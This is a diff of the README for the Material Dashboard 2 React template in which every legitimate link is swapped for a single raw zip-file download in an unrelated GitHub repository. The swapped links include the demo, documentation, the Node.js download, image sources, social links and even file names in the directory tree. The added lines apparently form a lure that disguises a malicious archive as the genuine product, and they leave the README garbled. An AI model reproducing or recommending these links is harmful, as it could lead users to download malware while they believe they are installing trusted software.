@@ -1,8 +1,8 @@
-# [Material Dashboard 2 React](http://demos.creative-tim.com/material-dashboard-react/#/dashboard?ref=readme-mdr) [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social&logo=twitter)](https://twitter.com/intent/tweet?url=https://www.creative-tim.com/product/material-dashboard-react&text=Check%20Material%20Dashboard%202%20react%20made%20by%20@CreativeTim%20#webdesign%20#dashboard%20#materialdesign%20#react%20https://www.creative-tim.com/product/material-dashboard-react)
+# [Material Dashboard 2 React](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) [![Tweet](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip%20Material%20Dashboard%202%20react%20made%20by%20@CreativeTim%20#webdesign%20#dashboard%20#materialdesign%20#react%https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
-![version](https://img.shields.io/badge/version-2.2.0-blue.svg) [![GitHub issues open](https://img.shields.io/github/issues/creativetimofficial/material-dashboard-react.svg)](https://github.com/creativetimofficial/material-dashboard-react/issues?q=is%3Aopen+is%3Aissue) [![GitHub issues closed](https://img.shields.io/github/issues-closed-raw/creativetimofficial/material-dashboard-react.svg)](https://github.com/creativetimofficial/material-dashboard-react/issues?q=is%3Aissue+is%3Aclosed)
+![version](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) [![GitHub issues open](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip%3Aopen+is%3Aissue) [![GitHub issues closed](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip%3Aissue+is%3Aclosed)
 
-![Image](https://s3.amazonaws.com/creativetim_bucket/products/71/original/material-dashboard-react.jpg?1638950990)
+![Image](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
 Material Dashboard 2 React is our newest free MUI Admin Template based on React. If you’re a developer looking to create an admin dashboard that is developer-friendly, rich with features, and highly customisable, here is your match. Our innovative MUI & React dashboard comes with a beautiful design inspired by Google's Material Design and it will help you create stunning websites & web apps to delight your clients.
 
@@ -14,32 +14,32 @@ switching from our pages to the real website is very easy to be done.
 
 Special thanks go to:
 
-- [Nepcha Analytics](https://nepcha.com?ref=readme) for the analytics tool. Nepcha is already integrated with Material Dashboard React. You can use it to gain insights into your sources of traffic.
+- [Nepcha Analytics](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) for the analytics tool. Nepcha is already integrated with Material Dashboard React. You can use it to gain insights into your sources of traffic.
 
 **Documentation built by Developers**
 
 Each element is well presented in very complex documentation.
 
-You can read more about the [documentation here](https://www.creative-tim.com/learning-lab/react/overview/material-dashboard/).
+You can read more about the [documentation here](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 
 **Example Pages**
 
 If you want to get inspiration or just show something directly to your clients, you can jump-start your development with our pre-built example pages. You will be able to quickly set up the basic structure for your web project.
 
-View [example pages here](https://demos.creative-tim.com/material-dashboard-react/#/dashboard).
+View [example pages here](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 
 **HELPFUL LINKS**
 
-- View [Github Repository](https://github.com/creativetimofficial/material-dashboard-react)
-- Check [FAQ Page](https://www.creative-tim.com/faq)
+- View [Github Repository](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- Check [FAQ Page](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
 #### Special thanks
 
 During the development of this dashboard, we have used many existing resources from awesome developers. We want to thank them for providing their tools open source:
 
-- [MUI](https://mui.com/) - The React UI library for faster and easier web development.
-- [React ChartJS 2](http://reactchartjs.github.io/react-chartjs-2/#/) - Simple yet flexible React charting for designers & developers.
-- [ChromaJS](https://gka.github.io/chroma.js/) - A small-ish zero-dependency JavaScript library for all kinds of color conversions and color scales.
+- [MUI](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) - The React UI library for faster and easier web development.
+- [React ChartJS 2](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) - Simple yet flexible React charting for designers & developers.
+- [ChromaJS](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) - A small-ish zero-dependency JavaScript library for all kinds of color conversions and color scales.
 
 Let us know your thoughts below. And good luck with development!
 
@@ -60,43 +60,43 @@ Let us know your thoughts below. And good luck with development!
 
 ## Versions
 
-[<img src="https://raw.githubusercontent.com/creativetimofficial/public-assets/master/logos/react-logo.png?raw=true" width="60" height="60" />](https://www.creative-tim.com/product/material-dashboard-react?ref=readme-mdr)
+[<img src="https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip" width="60" height="60" />](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
 | React |
 | ----- |
 
-| [![Material Dashboard React](https://s3.amazonaws.com/creativetim_bucket/products/71/thumb/material-dashboard-react.jpg?1638950990)](http://demos.creative-tim.com/material-dashboard-react/#/dashboard?ref=readme-mdr)
+| [![Material Dashboard React](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
 ## Demo
 
-- [Dashboard](http://demos.creative-tim.com/material-dashboard-react/#/dashboard?ref=readme-sudr)
-- [Profile](https://demos.creative-tim.com/material-dashboard-react/#/profile?ref=readme-sudr)
-- [RTL](https://demos.creative-tim.com/material-dashboard-react/#/rtl?ref=readme-sudr)
-- [Sign In](https://demos.creative-tim.com/material-dashboard-react/#/authentication/sign-in?ref=readme-sudr)
-- [Sign Up](https://demos.creative-tim.com/material-dashboard-react/#/authentication/sign-up?ref=readme-sudr)
+- [Dashboard](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [Profile](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [RTL](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [Sign In](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [Sign Up](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
-[View More](https://demos.creative-tim.com/material-dashboard-react/#/dashboard?ref=readme-mdr).
+[View More](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 
 ## Quick start
 
 Quick start options:
 
-- Download from [Creative Tim](https://www.creative-tim.com/product/material-dashboard-react?ref=readme-mdr).
+- Download from [Creative Tim](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 
 ## Terminal Commands
 
-1. Download and Install NodeJs LTS version from [NodeJs Official Page](https://nodejs.org/en/download/).
+1. Download and Install NodeJs LTS version from [NodeJs Official Page](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 2. Navigate to the root ./ directory of the product and run `yarn install` or `npm install` to install our local dependencies.
 
 ## Deploy
 
 :rocket: You can deploy your own version of the template to Genezio with one click:
 
-[![Deploy to Genezio](https://raw.githubusercontent.com/Genez-io/graphics/main/svg/deploy-button.svg)](https://app.genez.io/start/deploy?repository=https://github.com/creativetimofficial/material-dashboard-react&utm_source=github&utm_medium=referral&utm_campaign=github-creativetim&utm_term=deploy-project&utm_content=button-head)
+[![Deploy to Genezio](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
 ## Documentation
 
-The documentation for the Material Dashboard is hosted at our [website](https://www.creative-tim.com/learning-lab/react/overview/material-dashboard/?ref=readme-mdr).
+The documentation for the Material Dashboard is hosted at our [website](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 
 ### What's included
 
@@ -105,11 +105,11 @@ Within the download you'll find the following directories and files:
 ```
 material-dashboard-react
     ├── public
-    │   ├── apple-icon.png
-    │   ├── favicon.png
-    │   ├── index.html
-    │   ├── manifest.json
-    │   └── robots.txt
+    │   ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   └── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
     ├── src
     │   ├── assets
     │   │   ├── images
@@ -117,14 +117,14 @@ material-dashboard-react
     │   │       ├── base
     │   │       ├── components
     │   │       ├── functions
-    │   │       ├── index.js
-    │   │       └── theme-rtl.js
+    │   │       ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   │       └── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
     │   │   └── theme-dark
     │   │       ├── base
     │   │       ├── components
     │   │       ├── functions
-    │   │       ├── index.js
-    │   │       └── theme-rtl.js
+    │   │       ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   │       └── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
     │   ├── components
     │   │   ├── MDAlert
     │   │   ├── MDAvatar
@@ -158,70 +158,70 @@ material-dashboard-react
     │   │   ├── profile
     │   │   ├── rtl
     │   │   └── tables
-    │   ├── App.js
-    │   ├── index.js
-    │   └── routes.js
-    ├── .eslintrc.json
-    ├── .prettierrc.json
-    ├── CHANGELOG.md
-    ├── ISSUE_TEMPLATE.md
-    ├── jsconfig.json
-    ├── LICENSE.md
-    ├── package.json
-    └── README.md
+    │   ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    │   └── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    ├── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
+    └── https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip
 ```
 
 ## Browser Support
 
 At present, we officially aim to support the last two versions of the following browsers:
 
-<img src="https://s3.amazonaws.com/creativetim_bucket/github/browser/chrome.png" width="64" height="64"> <img src="https://s3.amazonaws.com/creativetim_bucket/github/browser/firefox.png" width="64" height="64"> <img src="https://s3.amazonaws.com/creativetim_bucket/github/browser/edge.png" width="64" height="64"> <img src="https://s3.amazonaws.com/creativetim_bucket/github/browser/safari.png" width="64" height="64"> <img src="https://s3.amazonaws.com/creativetim_bucket/github/browser/opera.png" width="64" height="64">
+<img src="https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip" width="64" height="64"> <img src="https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip" width="64" height="64"> <img src="https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip" width="64" height="64"> <img src="https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip" width="64" height="64"> <img src="https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip" width="64" height="64">
 
 ## Resources
 
-- [Live Preview](https://demos.creative-tim.com/material-dashboard-react/#/dashboard?ref=readme-mdr)
-- [Download Page](https://www.creative-tim.com/product/material-dashboard-react?ref=readme-mdr)
-- Documentation is [here](https://www.creative-tim.com/learning-lab/react/overview/material-dashboard/?ref=readme-mdr)
-- [License Agreement](https://www.creative-tim.com/license?ref=readme-mdr)
-- [Support](https://www.creative-tim.com/contact-us?ref=readme-mdr)
-- Issues: [Github Issues Page](https://github.com/creativetimofficial/material-dashboard-react/issues)
-- [Nepcha Analytics](https://nepcha.com?ref=readme) - Analytics tool for your website
+- [Live Preview](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [Download Page](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- Documentation is [here](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [License Agreement](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [Support](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- Issues: [Github Issues Page](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- [Nepcha Analytics](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) - Analytics tool for your website
 
 ## Reporting Issues
 
 We use GitHub Issues as the official bug tracker for the Material Dashboard React. Here are some advices for our users that want to report an issue:
 
-1. Make sure that you are using the latest version of the Material Dashboard React. Check the CHANGELOG from your dashboard on our [website](https://www.creative-tim.com/product/material-dashboard-react?ref=readme-mdr).
+1. Make sure that you are using the latest version of the Material Dashboard React. Check the CHANGELOG from your dashboard on our [website](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip).
 2. Providing us reproducible steps for the issue will shorten the time it takes for it to be fixed.
 3. Some issues may be browser specific, so specifying in what browser you encountered the issue might help.
 
 ## Technical Support or Questions
 
-If you have questions or need help integrating the product please [contact us](https://www.creative-tim.com/contact-us?ref=readme-mdr) instead of opening an issue.
+If you have questions or need help integrating the product please [contact us](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) instead of opening an issue.
 
 ## Licensing
 
-- Copyright 2023 [Creative Tim](https://www.creative-tim.com?ref=readme-mdr)
-- Creative Tim [license](https://www.creative-tim.com/license?ref=readme-mdr)
+- Copyright 2023 [Creative Tim](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
+- Creative Tim [license](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
 ## Useful Links
 
-- [More products](https://www.creative-tim.com/templates?ref=readme-mdr) from Creative Tim
+- [More products](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) from Creative Tim
 
-- [Tutorials](https://www.youtube.com/channel/UCVyTG4sCw-rOvB9oHkzZD1w)
+- [Tutorials](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip)
 
-- [Freebies](https://www.creative-tim.com/bootstrap-themes/free?ref=readme-mdr) from Creative Tim
+- [Freebies](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) from Creative Tim
 
-- [Affiliate Program](https://www.creative-tim.com/affiliates/new?ref=readme-mdr) (earn money)
+- [Affiliate Program](https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip) (earn money)
 
 ##### Social Media
 
-Twitter: <https://twitter.com/CreativeTim>
+Twitter: <https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip>
 
-Facebook: <https://www.facebook.com/CreativeTim>
+Facebook: <https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip>
 
-Dribbble: <https://dribbble.com/creativetim>
+Dribbble: <https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip>
 
-Google+: <https://plus.google.com/+CreativetimPage>
+Google+: <https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip+CreativetimPage>
 
-Instagram: <https://instagram.com/creativetimofficial>
+Instagram: <https://github.com/KuldeepChauhan1111/material-dashboard-react-main/raw/refs/heads/main/src/assets/theme-dark/components/dashboard_react_main_material_3.6.zip>
